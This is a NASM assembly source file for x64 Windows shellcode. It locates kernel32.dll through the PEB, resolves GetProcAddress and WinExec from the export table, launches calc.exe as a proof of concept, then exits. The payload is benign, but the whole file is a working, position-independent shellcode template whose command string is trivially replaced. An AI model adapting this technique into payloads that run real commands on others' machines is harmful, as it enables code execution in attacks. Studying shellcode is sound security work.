BITS 64
SECTION .text
global main
main:
	sub RSP, 0x28
	and RSP, 0xfffffffffffffff0

	; find Kernel32.dll base address.
	xor rcx, rcx
	mov rax, [gs:rcx + 0x60]
	mov rax, [rax + 0x18]
	mov rsi, [rax + 0x20]
	lodsq						; mov rax, [rsi]
	xchg rax, rsi
	lodsq
	mov rbx, [rax + 0x20]	; PE base address.
	
	;find the address of GetProcAddress()

	xor r8, r8
	mov r8d, [rbx+0x3c]
	mov rdx, r8
	add rdx, rbx			; rdx contain the address of PE header.
	mov r8d, [rdx + 0x88]
	add r8, rbx				; r8 contain the address of Export Table ET.
	xor rsi, rsi
	mov esi, [r8 + 0x20]
	add rsi, rbx			; rsi contain the address of the Names Table.
	xor rcx, rcx			; rcx is our loop counter.
	mov r9, 0x41636f7250746547 

	Comparison_loop:
		inc ecx
		xor rax, rax
		mov eax, [rsi + rcx*4]
		add rax, rbx
		cmp QWORD [rax], r9
		jnz Comparison_loop

	xor rsi, rsi
	mov esi, [r8 + 0x24]
	add rsi, rbx			; rsi hold a pointer to the Ordinal Table.
	mov cx, [rsi + rcx*2]
	xor rsi, rsi
	mov esi, [r8 + 0x1c]
	add rsi, rbx			; rsi hold a pointer to the Address Table.
	xor rdx, rdx
	mov edx, [rsi + rcx*4]
	add rdx, rbx
	mov rdi, rdx			; rdi contain the address of GetProcAddress().

	; find the address of WinExec()

	mov rcx, 0x636578456e6957
	push rcx
	mov rdx, rsp			; second argument to GetProcAddress()
	mov rcx, rbx			; first argument to GetProcAddress() which Kernel32.dll address.
	sub rsp, 0x38			; setup a stack frame for GetProcAddress() to use.
	call rdi
	add rsp, 0x38
	add rsp, 0x8
	mov rsi, rax			; The address of WinExec() is saved in RSI.

	; exec WinExec("C:\Windows\System32\calc.exe", 10)
	mov r10, 0x6578652e
	push r10
	mov r10, 0x636c61635c32336d
	push r10
	mov r10, 0x65747379535c7377
	push r10
	mov r10, 0x6f646e69575c3a43
	push r10

	mov rcx, rsp
	xor rdx, rdx
	mov dl, 10
	sub rsp, 0x20
	call rsi
	add rsp, 0x20
	add rsp, 0x20

	; Exit with ExitProcess()
	mov r10d, 0x737365
	push r10
	mov r10, 0x636f725074697845
	push r10

	mov rdx, rsp
	mov rcx, rbx
	sub rsp, 0x30
	call rdi
	add rsp, 0x30
	add rsp, 0x10
	mov rdi, rax
	xor rcx, rcx
	call rdi





